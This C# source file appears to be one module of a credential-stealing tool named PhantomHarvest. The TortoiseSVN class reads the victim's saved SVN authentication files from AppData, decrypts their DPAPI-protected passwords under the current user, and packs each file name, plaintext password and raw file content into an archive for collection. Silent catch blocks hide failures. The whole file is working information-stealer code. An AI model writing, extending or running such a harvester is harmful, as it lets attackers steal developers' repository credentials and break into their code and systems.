using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Tools
{
	internal class TortoiseSVN
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "TortoiseSVN\\auth\\svn.simple");
				if (Directory.Exists(path))
				{
					StringBuilder sb = new StringBuilder();
					foreach (string file in Directory.GetFiles(path))
					{
						try
						{
							byte[] bytes = LockedFile.ReadLockedFile(file);
							if (bytes != null)
							{
								string content = Encoding.UTF8.GetString(bytes);
								// 简单的 SVN 认证文件解析
								// 格式是 Key\nValue\n...
								// 我们查找 "password" 键
								
								if (content.Contains("password"))
								{
									// 只是转储整个文件内容还是尝试解析？
									// 让我们转储文件内容，但如果可能的话尝试解密密码。
									// 实际上，TortoiseSVN 存储的密码是用 DPAPI 加密的。
									
									string[] lines = content.Split('\n');
									for (int i = 0; i < lines.Length; i++)
									{
										if (lines[i].Trim() == "password")
										{
											// 下一行是长度，然后是值
											if (i + 2 < lines.Length)
											{
												string encPass = lines[i + 2].Trim();
												string decPass = Decrypt(encPass);
												sb.AppendLine("File: " + Path.GetFileName(file));
												sb.AppendLine("Decrypted Password: " + decPass);
												sb.AppendLine("Raw Content:\n" + content);
												sb.AppendLine("--------------------------------------------------");
												break;
											}
										}
									}
								}
							}
						}
						catch {}
					}
					
					if (sb.Length > 0)
					{
						using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(sb.ToString())))
						{
							zip.AddStream(ArchiveManager.Compression.Deflate, ToolName + "/AuthData.txt", ms, DateTime.Now, "");
						}
					}
				}
			}
			catch
			{
			}
		}

		public static string Decrypt(string input)
		{
			string result;
			try
			{
				result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(input), null, DataProtectionScope.CurrentUser));
			}
			catch
			{
				result = input;
			}
			return result;
		}

		public static string ToolName = "TortoiseSVN";
	}
}
